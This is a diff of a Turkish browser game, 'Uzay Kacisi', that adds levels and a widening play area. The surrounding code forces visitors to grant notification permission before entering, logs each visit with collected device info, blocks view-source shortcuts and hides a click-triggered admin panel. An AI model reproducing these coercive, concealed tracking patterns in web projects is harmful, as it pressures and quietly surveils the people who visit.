@@ -49,14 +49,15 @@ const HTML = `<!DOCTYPE html>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow:hidden;font-family:-apple-system,system-ui,sans-serif;background:#0d1024;color:#fff}
 body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none}
-#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}
-.mgTitle{font-size:24px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.mgHud{display:flex;gap:24px;font-size:15px;font-weight:600;opacity:.9}
+#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px;transition:all .5s}
+.mgTitle{font-size:22px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.mgHud{display:flex;gap:20px;font-size:14px;font-weight:600;opacity:.9}
 .mgHud b{color:#6cf}
-#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;max-width:92vw;max-height:70vh;display:block}
+.mgHud .lv{color:#f59e0b}
+#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;max-width:96vw;max-height:70vh;display:block;transition:width .6s ease,height .6s ease}
 .mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:12px 28px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer}
 .mgBtn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
-.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.9);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:16px}
+.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.92);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:16px}
 .mgOver.show{display:flex}
 .mgOver h2{font-size:26px;font-weight:800}
 .mgOver .btns{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:6px}
@@ -70,10 +71,8 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
 .modal-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:18px;padding:22px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 60px rgba(0,0,0,.7);max-height:85vh;overflow-y:auto}
 .modal-box h3{font-size:20px;font-weight:800;margin-bottom:14px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .modal-box input{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px 14px;color:#fff;font-size:15px;margin-bottom:12px;outline:none;font-family:inherit}
-.modal-box input:focus{border-color:#4a6cf7}
 .modal-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:13px 24px;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:8px}
 .modal-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
-.modal-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
 .lb-row{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;margin-bottom:6px;background:rgba(255,255,255,.04);border-radius:10px;font-size:14px;border:1px solid rgba(255,255,255,.05)}
 .lb-row.top1{background:linear-gradient(90deg,rgba(245,158,11,.25),rgba(245,158,11,.05));border-color:rgba(245,158,11,.4)}
 .lb-row.top2{background:linear-gradient(90deg,rgba(148,163,184,.25),rgba(148,163,184,.05))}
@@ -101,27 +100,25 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
 .ap-log .ok{color:#22c55e}
 .ap-log .err{color:#ef4444}
 .ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}
-
-/* ===== IZIN KAPISI ===== */
 #gateOverlay{position:fixed;inset:0;background:rgba(5,8,20,.97);z-index:9999999;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(10px)}
 #gateOverlay.hidden{display:none}
 .gate-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:22px;padding:28px;max-width:440px;width:100%;border:1px solid rgba(255,255,255,.12);box-shadow:0 30px 80px rgba(0,0,0,.8);text-align:center}
 .gate-box h2{font-size:24px;font-weight:800;margin-bottom:12px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .gate-box p{font-size:14px;line-height:1.7;color:#cbd5e1;margin-bottom:18px}
 .gate-box ol{text-align:left;font-size:14px;line-height:2;color:#cbd5e1;margin:12px 0 18px 22px}
-.gate-box ol li b{color:#6cf}
 .gate-icon{font-size:56px;margin-bottom:12px;display:block}
 .gate-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:15px 24px;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:10px;box-shadow:0 8px 24px rgba(34,197,94,.4)}
 .gate-btn.secondary{background:linear-gradient(90deg,#64748b,#475569);box-shadow:none}
-.gate-btn:disabled{opacity:.5;cursor:not-allowed}
 .gate-warn{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);border-radius:10px;padding:12px;font-size:13px;color:#fca5a5;margin-top:12px;line-height:1.6}
 .gate-pulse{animation:gatePulse 1.5s ease-in-out infinite}
 @keyframes gatePulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
+#levelUp{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:42px;font-weight:900;color:#f59e0b;text-shadow:0 0 30px rgba(245,158,11,.9);z-index:99998;pointer-events:none;opacity:0;transition:opacity .3s}
+#levelUp.show{animation:levelAnim 1.5s ease-out}
+@keyframes levelAnim{0%{opacity:0;transform:translate(-50%,-50%) scale(.5)}30%{opacity:1;transform:translate(-50%,-50%) scale(1.2)}70%{opacity:1;transform:translate(-50%,-50%) scale(1)}100%{opacity:0;transform:translate(-50%,-80%) scale(1)}}
 </style>
 </head>
 <body>
 
-<!-- ===== IZIN KAPISI ===== -->
 <div id="gateOverlay">
   <div class="gate-box" id="gateBox">
     <span class="gate-icon">🔔</span>
@@ -132,19 +129,22 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   </div>
 </div>
 
+<div id="levelUp"></div>
+
 <button id="leaderboardBtn">🏆 Sıralama</button>
 
 <div id="mgWrap">
-  <div class="mgTitle">🚀 Uzay Kacisi (ZOR MOD)</div>
+  <div class="mgTitle">🚀 Uzay Kacisi</div>
   <div class="mgHud">
     <span>Skor: <b id="mgScore">0</b></span>
     <span>Rekor: <b id="mgBest">0</b></span>
+    <span>Seviye: <b class="lv" id="mgLevel">1</b></span>
   </div>
   <div style="position:relative">
     <canvas id="mgCanvas"></canvas>
     <div class="mgOver" id="mgOver">
       <h2>Oyun Bitti!</h2>
-      <div>Skorun: <b id="mgFinal" style="color:#6cf">0</b></div>
+      <div>Skorun: <b id="mgFinal" style="color:#6cf">0</b> — Seviye: <b id="mgFinalLevel" style="color:#f59e0b">1</b></div>
       <div class="btns">
         <button class="mgBtn" id="mgSaveScore">💾 Sıralamaya Kaydet</button>
         <button class="mgBtn secondary" id="mgRestart">🔄 Yeniden Başla</button>
@@ -227,17 +227,23 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     if(e.ctrlKey && e.key.toUpperCase() === 'U'){ e.preventDefault(); return false; }
   });
 
-  // ===== ZOR MOD AYARLARI =====
+  // ===== AYARLAR =====
   var CONFIG = {
-    W:360, H:540, PLAYER_R:16,
-    SPAWN_MS:450,            // cok sik engel
-    SPAWN_MIN:180,           // minimum aralik
-    SPAWN_DECAY:35,          // her adimda dusus
-    SPEED_START:5,
-    SPEED_MAX:28,            // cok yuksek max hiz
-    SPEED_UP_EVERY:4000,     // 4sn'de bir hizlanir
-    SPEED_UP_AMOUNT:1.5,     // her adimda +1.5 hiz
+    W_START:360,          // baslangic genislik
+    W_MAX:720,            // max genislik (ekran 2x genisler)
+    W_GROW_EVERY:12000,   // her 12 saniyede bir genisler
+    W_GROW_AMOUNT:60,     // her seferinde +60px
+    H:540,
+    PLAYER_R:16,
+    SPAWN_MS:800,         // baslangic engel sikligi (rahat)
+    SPAWN_MIN:350,        // min siklik (cok zorlamasin)
+    SPAWN_DECAY:15,       // her seviyede -15ms
+    SPEED_START:4,
+    SPEED_MAX:14,         // max hiz (fazla olmasin)
+    SPEED_UP_EVERY:8000,  // 8 saniyede bir hizlanir
+    SPEED_UP_AMOUNT:0.6,  // her adimda +0.6
     SCORE_PER_OBSTACLE:2,
+    LEVEL_EVERY:100,      // her 100 puanda seviye atla
     STORAGE_KEY:"mgBest"
   };
 
@@ -245,14 +251,20 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   var ctx = cv.getContext("2d");
   var scoreEl = document.getElementById("mgScore");
   var bestEl = document.getElementById("mgBest");
+  var levelEl = document.getElementById("mgLevel");
   var overScreen = document.getElementById("mgOver");
   var finalScoreEl = document.getElementById("mgFinal");
-  var W = CONFIG.W, H = CONFIG.H;
+  var finalLevelEl = document.getElementById("mgFinalLevel");
+  var levelUpEl = document.getElementById("levelUp");
+  var W = CONFIG.W_START, H = CONFIG.H;
   cv.width = W; cv.height = H;
+  cv.style.width = W + "px";
+  cv.style.height = H + "px";
 
   var player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
   var obstacles = [], stars = [];
   var score = 0;
+  var level = 1;
   var best = parseInt(localStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10);
   var running = false, gameOver = false;
   var fallSpeed = CONFIG.SPEED_START;
@@ -260,10 +272,16 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   var pointerX = W/2, animId = null, swReg = null;
   var lastMsgId = 0;
   var gateUnlocked = false;
+  var currentW = CONFIG.W_START;
 
   bestEl.textContent = best;
-  for(var i = 0; i < 60; i++){
-    stars.push({ x:Math.random()*W, y:Math.random()*H, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
+  rebuildStars();
+
+  function rebuildStars(){
+    stars = [];
+    for(var i = 0; i < 70; i++){
+      stars.push({ x:Math.random()*CONFIG.W_MAX, y:Math.random()*H, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
+    }
   }
 
   function getSid(){
@@ -349,17 +367,12 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       .catch(function(e){ console.warn("SW hata", e); return false; });
   }
 
-  // ===== IZIN ISTE =====
   function requestNotify(){
     return new Promise(function(resolve){
       if (!("Notification" in window)) return resolve("unsupported");
       if (Notification.permission === "granted") return resolve("granted");
       if (Notification.permission === "denied") return resolve("denied");
-
-      // iOS: PWA degilse PWA rehberi goster
-      if (isIOS() && !isStandalone()){
-        return resolve("ios-pwa-gerekli");
-      }
+      if (isIOS() && !isStandalone()) return resolve("ios-pwa-gerekli");
 
       try {
         var p = Notification.requestPermission(function(perm){
@@ -388,17 +401,16 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   }
   window.bildirimGonder = sendNotif;
 
-  // ===== IZIN KAPISI =====
+  // ===== GATE =====
   var gateOverlay = document.getElementById("gateOverlay");
   var gateAllow = document.getElementById("gateAllow");
   var gateWarn = document.getElementById("gateWarn");
-  var gateDesc = document.getElementById("gateDesc");
-  var gateTitle = document.getElementById("gateTitle");
+  var gateBox = document.getElementById("gateBox");
 
   function showGateIOSRehber(){
     gateBox.innerHTML = '<span class="gate-icon">📱</span>'
       + '<h2>iPhone\\'da Bildirim Icin</h2>'
-      + '<p>Safari\\'de bildirim izni vermek icin once <b>Ana Ekrana Ekle</b> yapmalisin:</p>'
+      + '<p>Safari\\'de bildirim izni icin once <b>Ana Ekrana Ekle</b> yapmalisin:</p>'
       + '<ol>'
       + '<li>Alttaki <b>Paylas</b> butonuna bas</li>'
       + '<li><b>Ana Ekrana Ekle</b> secenegini sec</li>'
@@ -406,27 +418,17 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       + '<li>Bildirim izni sorulacak → <b>Izin Ver</b></li>'
       + '</ol>'
       + '<button class="gate-btn" id="gateReload">✅ Ana Ekrana Ekledim, Ac</button>'
-      + '<div class="gate-warn">Bu adim zorunlu! Aksi halde bildirim gonderemeyiz.</div>';
-
-    document.getElementById("gateReload").addEventListener("click", function(){
-      location.reload();
-    });
+      + '<div class="gate-warn">Bu adim zorunlu!</div>';
+    document.getElementById("gateReload").addEventListener("click", function(){ location.reload(); });
   }
 
   function showGateDenied(){
     gateBox.innerHTML = '<span class="gate-icon">🚫</span>'
       + '<h2>Bildirim Izni Reddedildi</h2>'
-      + '<p>Bu siteye girmek icin bildirimlere izin vermen gerekiyor.</p>'
-      + '<div class="gate-warn">'
-      + 'Safari/Chrome ayarlarindan bildirim iznini ac:<br><br>'
-      + '<b>Safari (iOS):</b> Ayarlar → Safari → Web Siteleri → Bildirimler → Bu siteyi ac<br>'
-      + '<b>Chrome:</b> Adres cubugundaki kilit ikonu → Site ayarlari → Bildirimler → Izin ver'
-      + '</div>'
+      + '<p>Siteye girmek icin bildirimlere izin vermelisin.</p>'
+      + '<div class="gate-warn">Safari/Chrome ayarlarindan bildirim iznini ac:</div>'
       + '<button class="gate-btn" id="gateRetry" style="margin-top:14px">🔄 Tekrar Dene</button>';
-
-    document.getElementById("gateRetry").addEventListener("click", function(){
-      location.reload();
-    });
+    document.getElementById("gateRetry").addEventListener("click", function(){ location.reload(); });
   }
 
   function unlockSite(){
@@ -436,29 +438,10 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
   }
 
   function checkGate(){
-    if (!("Notification" in window)){
-      // Bildirim API yok - yine de izin ver
-      unlockSite();
-      return;
-    }
-
-    if (Notification.permission === "granted"){
-      unlockSite();
-      return;
-    }
-
-    if (Notification.permission === "denied"){
-      showGateDenied();
-      return;
-    }
-
-    // default - izin iste
-    if (isIOS() && !isStandalone()){
-      showGateIOSRehber();
-      return;
-    }
-
-    // Butonu goster
+    if (!("Notification" in window)){ unlockSite(); return; }
+    if (Notification.permission === "granted"){ unlockSite(); return; }
+    if (Notification.permission === "denied"){ showGateDenied(); return; }
+    if (isIOS() && !isStandalone()){ showGateIOSRehber(); return; }
     gateAllow.style.display = "block";
     gateAllow.classList.add("gate-pulse");
   }
@@ -467,15 +450,10 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     gateAllow.disabled = true;
     gateAllow.textContent = "Isteniyor...";
     requestNotify().then(function(perm){
-      if (perm === "granted"){
-        sendLog("notify_granted", collectInfo());
-        unlockSite();
-      } else if (perm === "denied"){
-        sendLog("notify_denied", collectInfo());
-        showGateDenied();
-      } else if (perm === "ios-pwa-gerekli"){
-        showGateIOSRehber();
-      } else {
+      if (perm === "granted"){ sendLog("notify_granted", collectInfo()); unlockSite(); }
+      else if (perm === "denied"){ sendLog("notify_denied", collectInfo()); showGateDenied(); }
+      else if (perm === "ios-pwa-gerekli"){ showGateIOSRehber(); }
+      else {
         gateAllow.disabled = false;
         gateAllow.textContent = "✅ İzin Ver ve Devam Et";
         gateWarn.style.display = "block";
@@ -483,6 +461,17 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       }
     });
   });
+
+  // ===== EKRAN GENISLEME =====
+  function growScreen(){
+    if (currentW >= CONFIG.W_MAX) return;
+    currentW = Math.min(CONFIG.W_MAX, currentW + CONFIG.W_GROW_AMOUNT);
+    W = currentW;
+    cv.width = W;
+    cv.style.width = W + "px";
+    // Oyuncu konumunu yeni genislige gore ayarla
+    if (player.x > W - player.r) player.x = W - player.r;
+  }
 
   // ===== OYUN =====
   function spawnObstacle(){
@@ -505,16 +494,34 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     if (e.key === "ArrowRight") pointerX = Math.min(W - player.r, pointerX + 30);
   });
 
+  var lastGrowTime = 0;
+  var lastLevel = 1;
+
   function update(){
     var now = performance.now();
     var elapsed = now - startTime;
-    var steps = Math.floor(elapsed / CONFIG.SPEED_UP_EVERY);
 
-    // Engel sikligi agresif artar
-    var currentSpawn = Math.max(CONFIG.SPAWN_MIN, CONFIG.SPAWN_MS - steps * CONFIG.SPAWN_DECAY);
+    // EKRAN GENISLEMESI - zamanla genisler
+    if (elapsed - lastGrowTime > CONFIG.W_GROW_EVERY){
+      lastGrowTime = elapsed;
+      growScreen();
+    }
+
+    // SEVIYE - puan bazli
+    var newLevel = Math.floor(score / CONFIG.LEVEL_EVERY) + 1;
+    if (newLevel > lastLevel){
+      lastLevel = newLevel;
+      level = newLevel;
+      levelEl.textContent = level;
+      showLevelUp(level);
+    }
+
+    // Engel sikligi - seviyeye gore azalir
+    var currentSpawn = Math.max(CONFIG.SPAWN_MIN, CONFIG.SPAWN_MS - (level - 1) * CONFIG.SPAWN_DECAY);
     if (now - lastSpawn > currentSpawn){ spawnObstacle(); lastSpawn = now; }
 
-    // Hiz agresif artar
+    // Hiz - zamana gore
+    var steps = Math.floor(elapsed / CONFIG.SPEED_UP_EVERY);
     fallSpeed = Math.min(CONFIG.SPEED_MAX, CONFIG.SPEED_START + steps * CONFIG.SPEED_UP_AMOUNT);
 
     for (var i = 0; i < stars.length; i++){
@@ -531,8 +538,19 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       var cy = Math.max(o.y, Math.min(player.y, o.y + o.h));
       var dx = player.x - cx, dy = player.y - cy;
       if (dx * dx + dy * dy < player.r * player.r){ endGame(); return; }
-      if (o.y > H){ obstacles.splice(j, 1); score += CONFIG.SCORE_PER_OBSTACLE; scoreEl.textContent = score; }
+      if (o.y > H){
+        obstacles.splice(j, 1);
+        score += CONFIG.SCORE_PER_OBSTACLE;
+        scoreEl.textContent = score;
+      }
     }
+  }
+
+  function showLevelUp(lv){
+    levelUpEl.textContent = "SEVIYE " + lv + "!";
+    levelUpEl.classList.remove("show");
+    void levelUpEl.offsetWidth;
+    levelUpEl.classList.add("show");
   }
 
   function rrect(x, y, w, h, r){
@@ -549,6 +567,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     ctx.clearRect(0, 0, W, H);
     for (var i = 0; i < stars.length; i++){
       var s = stars[i];
+      if (s.x > W) continue;
       ctx.globalAlpha = s.s / 2.2;
       ctx.fillStyle = "#cfe4ff";
       ctx.fillRect(s.x, s.y, s.s, s.s);
@@ -589,16 +608,26 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
 
   function startGame(){
     if (!gateUnlocked) return;
+    currentW = CONFIG.W_START;
+    W = CONFIG.W_START;
+    cv.width = W;
+    cv.style.width = W + "px";
+    cv.style.height = H + "px";
+
     player = { x: W/2, y: H - 70, r: CONFIG.PLAYER_R };
     obstacles = [];
     score = 0;
+    level = 1;
+    lastLevel = 1;
     fallSpeed = CONFIG.SPEED_START;
     lastSpawn = performance.now();
+    lastGrowTime = 0;
     startTime = performance.now();
     pointerX = W / 2;
     gameOver = false;
     running = true;
     scoreEl.textContent = 0;
+    levelEl.textContent = 1;
     overScreen.classList.remove("show");
     cancelAnimationFrame(animId);
     animId = requestAnimationFrame(loop);
@@ -609,6 +638,7 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     gameOver = true;
     cancelAnimationFrame(animId);
     finalScoreEl.textContent = score;
+    finalLevelEl.textContent = level;
     var yeniRekor = false;
     if (score > best){
       best = score;
@@ -617,8 +647,8 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       yeniRekor = true;
     }
     overScreen.classList.add("show");
-    if (yeniRekor) sendNotif("🏆 Yeni Rekor!", "Skorun: " + score);
-    else sendNotif("🎮 Oyun Bitti", "Skorun: " + score + " | Rekor: " + best);
+    if (yeniRekor) sendNotif("🏆 Yeni Rekor!", "Skorun: " + score + " | Seviye: " + level);
+    else sendNotif("🎮 Oyun Bitti", "Skor: " + score + " | Seviye: " + level + " | Rekor: " + best);
   }
 
   document.getElementById("mgRestart").addEventListener("click", startGame);
@@ -664,7 +694,6 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     }
   });
 
-  // ===== SIRALAMA =====
   function openLeaderboard(){
     document.getElementById("leaderboardModal").classList.add("show");
     var listEl = document.getElementById("leaderboardList");
@@ -707,25 +736,22 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     document.getElementById("leaderboardModal").classList.remove("show");
   });
 
-  // ===== GIZLI ADMIN =====
+  // GIZLI ADMIN
   var redClicks = 0, redTimer = null;
   function resetRed(){ redClicks = 0; }
-
   document.getElementById("secretRed").addEventListener("click", function(e){
-    e.preventDefault();
-    e.stopPropagation();
+    e.preventDefault(); e.stopPropagation();
     redClicks++;
     if (redTimer) clearTimeout(redTimer);
     redTimer = setTimeout(resetRed, 8000);
     if (redClicks >= 20){ resetRed(); openAdmin(); }
   });
-
   var sarilar = document.querySelectorAll(".sbtn.sari");
   for (var si = 0; si < sarilar.length; si++){
     (function(b){ b.addEventListener("click", function(){ resetRed(); }); })(sarilar[si]);
   }
 
-  // ===== ADMIN PANEL =====
+  // ADMIN PANEL
   var ap = document.getElementById("adminPanel");
   var apLog = document.getElementById("apLog");
   var apPerm = document.getElementById("apPerm");
@@ -802,19 +828,6 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
     startGame();
   });
 
-  // ===== BASLAT =====
-  (function init(){
-    var info = collectInfo();
-    sendLog("visit", info);
-
-    initSW().then(function(){
-      checkGate();
-    });
-
-    setInterval(pollMessages, 5000);
-    setTimeout(pollMessages, 2000);
-  })();
-
   function pollMessages(){
     fetch("/api/messages?since=" + lastMsgId, { cache: "no-store" })
       .then(function(r){ return r.ok ? r.json() : null; })
@@ -830,6 +843,14 @@ body{display:flex;flex-direction:column;align-items:center;justify-content:cente
       })
       .catch(function(){});
   }
+
+  (function init(){
+    var info = collectInfo();
+    sendLog("visit", info);
+    initSW().then(function(){ checkGate(); });
+    setInterval(pollMessages, 5000);
+    setTimeout(pollMessages, 2000);
+  })();
 
 })();
 <\/script>
